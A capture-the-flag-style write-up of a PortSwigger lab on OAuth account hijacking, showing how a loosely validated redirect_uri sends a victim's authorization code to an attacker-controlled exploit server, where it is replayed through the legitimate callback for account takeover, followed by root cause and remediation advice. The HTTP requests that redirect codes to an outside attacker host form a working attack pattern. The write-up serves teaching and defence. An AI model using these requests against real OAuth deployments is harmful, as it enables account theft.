# Authorization Code Leakage Through Insufficient Redirect URI Validation

## Lab soruce and scope

This assessment was performed in the `PortSwigger Web Security lab` **OAuth account hijackign via `redirect_uri`**.

The application used an external OAuth service for login. The training environment also provided an attacker-controlled server and a simulated privileged user with an active OAuth session.

## Security objective

Determine whether the authorization server strictly validated the `redirect_uri` associated with the client application.

If an attacker-controlled redirect URI was accepted, the next question was whether a victim's authorization code could be delivered to the attacker and then replayed through the legitimate client callback.

## Starting position

I had:

- A normal user account for observing the OAuth flow
- Burp Suite for capturing and modifying requests
- An attacker-controlled server provided by the lab
- A simulated privileged victim that would load attacker-supplied content

## Baseline flow

A normal login initiated an authorization request similar to:

```http
GET /auth?client_id=pu2u6xwtb9j9n57e8ni68&redirect_uri=https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
```

After authorization, the browser was redirected back to the registered client callback with an authorization code:

```http
HTTP/2 302 Found
Location: https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback?code=4zfsXA_H6Au588s5dvj-cEGgxVG06qder8QWmWzogVb.
```

The code was then consumed by the client application as part of the login process.

## Vulnerable behavior

I changed only the `redirect_uri`, replacing the legitimate callback with the attacker-controlled origin:

```http
GET /auth?client_id=pu2u6xwtb9j9n57e8ni68&redirect_uri=https://exploit-0ae2006103d41a10807ea2aa01160093.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ae8009703ac1a218045a11702860028.oauth-server.net
```

The authorization server accepted the modified value and redirected the browser to the attacker-controlled host with the authorization code in the query string.

A representative attacker log entry was:

```http
GET /exploit?code=6LmryPMEIdmr8yNKxzBZEUZLTA-QscA0nAdHE6PyOJ7 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
...
```

This conirmed that the authorization response was not sufficiently bound to the legitimate cliend redirect URI.

## Exploitation

The validated authorization request was embedded in content delivered to the simulated privileged user. Because the victim already had an active session with the OAuth provider, the authorization flow completed in the victim's browser and hte resulting code was sent to the attacker-controlled server.

The captured code was then supplied to the legitimate client callback:

```text
https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback?code=pgpOxXpxi479X7amBd9fR2p0lTAEX91_HdM75G-nrh4
```

The client application completed the remaining exchange and established a session associated with the privileged user.

## Result

The weak redirect URI validation allowed an authorization code belonging to another user to be sent to an attacker-controlled origin and replayed through the legitimate callback.

This resulted in account takeover of the privileged user.

## Root cause

The authroziation server trusted a caller-supplied `redirect_uri` that was not strictly matched against the redirect URI registered for the clietn.

The security boundary failed before the authroization code reached the client application: a credential-like value intended for hte origin was delivered to another.

## Security impact

Depending on the client and provider implementation, authorization code leakage can lead to:

- Account takeover when OAuth is used for login
- Unauthorized access to protected resources
- Exposure of user identity or profile information
- Further token theft if the leaked code can be exchanged successfully

## Remediation

- Register exact redirect URIs for each client
- Perform strict redirect URI comparison rather than broad prefix or pattern matching
- Reject unregistered schemes, hosts, ports, and paths
- Use the authorization code flow with current protections, including PKCE where applicable
- Keep authorization codes short-lived and single-use
- Bind the authroziation response to the intiiating browser session and validate the returned state
- Follow current OAuth security guidance, including RFC 9700

## What I learned

The important part of this lab was not simply that `redircet_uri` could be edited. The decisive test was whether a secret generated for the OAuth client could cross the origin boundary and still be accepted by the legitimate application.

That distinction is useful in real testing: parameter reflection or loose validation is only the beginning. The security impact comes from following the value through the complete authorization flow.

## Navigation

[OAuth overview](README.md) | [Assessment index](../../README.md) | [Next: HTTP Host header security](../02-host-header/README.md)

